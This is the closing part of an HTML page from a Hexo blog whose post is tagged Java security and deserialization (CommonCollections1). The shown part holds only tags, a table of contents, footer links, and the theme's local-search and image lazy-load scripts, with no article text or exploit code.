+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                        <b>#</b> JAVA安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                        <b>#</b> JAVA安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化">
+                        <b>#</b> 反序列化
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/CommonCollections1/" title="CommonCollections1">
+                        <b>#</b> CommonCollections1
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div class="post-catalog" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#InvokerTransformer"><span class="toc-text">InvokerTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ChainedTransformer"><span class="toc-text">ChainedTransformer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ConstantTransformer"><span class="toc-text">ConstantTransformer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap"><span class="toc-text">LazyMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/Weik1">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="1252820849@qq.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" href="">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" href="">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2020</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=i;var e=n.imageLazyLoadSetting.isSPA,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight||document.documentElement.clientHeight)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},n.src=i}()}i(),n.addEventListener("scroll",function(){var t,e;t=i,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
